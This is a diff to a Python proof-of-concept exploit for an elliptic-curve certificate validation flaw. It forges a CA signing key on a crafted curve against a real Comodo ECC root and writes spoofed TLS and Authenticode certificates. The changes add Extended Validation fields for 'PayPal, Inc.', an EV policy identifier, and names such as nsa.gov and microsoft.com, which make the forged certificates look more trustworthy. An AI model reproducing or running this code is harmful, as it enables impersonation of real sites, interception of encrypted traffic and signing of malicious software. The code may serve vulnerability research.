@@ -13,26 +13,16 @@ import ecdsa.util
 from asn1crypto import core, keys, pem, x509
 
 
-def cacert_certificates() -> Iterable[x509.Certificate]:
-    with open("cacerts.pem", "rb") as f:
+def cacert_certificates(filename: str) -> Iterable[x509.Certificate]:
+    with open(
+        os.path.join(os.path.dirname(os.path.abspath(__file__)), filename), "rb"
+    ) as f:
         pem_bytes = f.read()
 
     for object_type, _, der_bytes in pem.unarmor(pem_bytes, multiple=True):
         if object_type != "CERTIFICATE":
             continue
         yield x509.Certificate.load(der_bytes)
-
-
-def get_root_ca_cert() -> x509.Certificate:
-    for certificate in cacert_certificates():
-        if (
-            certificate.subject.native.get("organizational_unit_name")
-            != "GlobalSign ECC Root CA - R5"
-        ):
-            continue
-        return certificate
-
-    raise ValueError("Could not find valid certificate authority")
 
 
 def generate_ec_private_key(name: str) -> keys.ECPrivateKey:
@@ -111,6 +101,11 @@ def exploit_certificate(
 
     exploit_curve = curve_from_ec_parameters(parameters)
     signing_key = ecdsa.keys.SigningKey.from_secret_exponent(k, curve=exploit_curve)
+
+    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})
+    certificate["tbs_certificate"]["signature"] = signed_digest_algorithm
+    certificate["signature_algorithm"] = signed_digest_algorithm
+
     sign_certificate(signing_key, certificate)
 
     return (signing_key, ec_private_key)
@@ -160,7 +155,8 @@ def random_serial_number() -> int:
 
 
 def write_tls_certificate(
-    root_ca_cert: x509.Certificate,
+    ca_cert: x509.Certificate,
+    ca_cert_orig: x509.Certificate,
     signing_key: ecdsa.keys.SigningKey,
     name: str,
     subject: x509.Name,
@@ -175,7 +171,7 @@ def write_tls_certificate(
                 "version": "v3",
                 "serial_number": random_serial_number(),
                 "signature": signed_digest_algorithm,
-                "issuer": root_ca_cert.subject,
+                "issuer": ca_cert_orig.subject,
                 "validity": {
                     "not_before": x509.UTCTime(
                         datetime.datetime(2018, 1, 1, tzinfo=datetime.timezone.utc)
@@ -200,6 +196,13 @@ def write_tls_certificate(
                             for dns_name in subject_alt_names
                         ],
                     },
+                    {
+                        "extn_id": "certificate_policies",
+                        "critical": False,
+                        "extn_value": [
+                            {"policy_identifier": "1.3.6.1.4.1.6449.1.2.1.5.1"},
+                        ],
+                    },
                 ],
             },
             "signature_algorithm": signed_digest_algorithm,
@@ -210,16 +213,18 @@ def write_tls_certificate(
 
     with open(name + ".crt", "wb") as f:
         write_pem(f, certificate, "CERTIFICATE")
-        write_pem(f, root_ca_cert, "CERTIFICATE")
+        write_pem(f, ca_cert_orig, "CERTIFICATE")
+        write_pem(f, ca_cert, "CERTIFICATE")
 
     with open(name + ".key", "wb") as f:
         write_pem(f, private_key, "PRIVATE KEY")
         write_pem(f, certificate, "CERTIFICATE")
-        write_pem(f, root_ca_cert, "CERTIFICATE")
+        write_pem(f, ca_cert_orig, "CERTIFICATE")
+        write_pem(f, ca_cert, "CERTIFICATE")
 
 
 def write_authenticode_certificate(
-    root_ca_cert: x509.Certificate,
+    ca_cert: x509.Certificate,
     signing_key: ecdsa.keys.SigningKey,
     name: str,
     subject: x509.Name,
@@ -233,7 +238,7 @@ def write_authenticode_certificate(
                 "version": "v3",
                 "serial_number": random_serial_number(),
                 "signature": signed_digest_algorithm,
-                "issuer": root_ca_cert.subject,
+                "issuer": ca_cert.subject,
                 "validity": {
                     "not_before": x509.UTCTime(
                         datetime.datetime(2018, 1, 1, tzinfo=datetime.timezone.utc)
@@ -274,7 +279,7 @@ def write_authenticode_certificate(
 
     with open(name + ".crt", "wb") as f:
         write_pem(f, certificate, "CERTIFICATE")
-        write_pem(f, root_ca_cert, "CERTIFICATE")
+        write_pem(f, ca_cert, "CERTIFICATE")
 
     with open(name + ".key", "wb") as f:
         write_pem(f, private_key, "PRIVATE KEY")
@@ -316,29 +321,22 @@ def get_name(purpose: Optional[str] = None) -> str:
 
 
 def main() -> None:
-    root_ca_cert = get_root_ca_cert()
-
-    issuer = x509.Name.build(
-        {
-            "country_name": "GB",
-            "common_name": get_name("Root CA"),
-            "organization_name": get_name(),
-            "organizational_unit_name": get_name("Root CA"),
-        }
+    _, ca_cert, _ = cacert_certificates(
+        "comodoecccertificationauthority-ev-comodoca-com-chain.pem"
     )
-    root_ca_cert["tbs_certificate"]["subject"] = issuer
-    root_ca_cert["tbs_certificate"]["issuer"] = issuer
+    ca_cert_orig = ca_cert.copy()
 
-    signing_key, ec_private_key = exploit_certificate(root_ca_cert)
+    signing_key, ec_private_key = exploit_certificate(ca_cert)
 
     with open("rootCA.crt", "wb") as f:
-        write_pem(f, root_ca_cert, "CERTIFICATE")
+        write_pem(f, ca_cert_orig, "CERTIFICATE")
+        write_pem(f, ca_cert, "CERTIFICATE")
 
     with open("rootCA.key", "wb") as f:
         write_pem(f, ec_private_key, "EC PRIVATE KEY")
 
     write_authenticode_certificate(
-        root_ca_cert,
+        ca_cert,
         signing_key,
         "authenticode",
         x509.Name.build(
@@ -352,13 +350,20 @@ def main() -> None:
     )
 
     write_tls_certificate(
-        root_ca_cert,
+        ca_cert,
+        ca_cert_orig,
         signing_key,
         "localhost",
         x509.Name.build(
-            {"common_name": get_name("Certificate"), "organization_name": get_name()}
+            {
+                "incorporation_country": "US",
+                "business_category": "Private Organization",
+                "serial_number": "1",
+                "country_name": "US",
+                "organization_name": "PayPal, Inc.",
+            }
         ),
-        ("localhost", "nsa.gov", "*.nsa.gov", "microsoft.com", "*.microsoft.com"),
+        ("localhost", "nsa.gov", "www.nsa.gov", "microsoft.com", "www.microsoft.com"),
     )
 
 
